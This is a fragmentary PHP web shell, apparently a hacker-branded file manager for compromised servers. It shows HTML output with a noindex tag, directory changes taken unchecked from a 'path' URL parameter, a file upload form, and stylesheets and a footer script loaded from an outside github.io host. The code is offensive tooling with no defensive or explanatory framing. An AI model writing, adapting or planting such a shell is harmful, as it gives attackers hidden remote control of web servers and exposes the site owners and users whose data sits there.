...
echo '<!DOCTYPE html><html><head><meta name="robots" content"noindex. nofollow"><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet"><DIV align=center><IMG src="https://telegra.ph/file/9cf1818175f70d3ca7143.png" width=250 height=250><title>'.$sname.'</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><link href="https://dhaffnavyz.github.io/dhaffhost/css/shell.mini.min.css" rel="stylesheet" type="text/css"></head><body>';

echo '<div style="color:#b6baba;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
...
echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#fc0d0d;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
...
echo '<br><center>&copy; <span id="footer"></span> 2022.</center><br>';
echo '<script type="text/javascript" src="https://dhaffnavyz.github.io/dhaffhost/js/foother.js"></script>';
echo '</body></html><!-- EOF -->';
?>
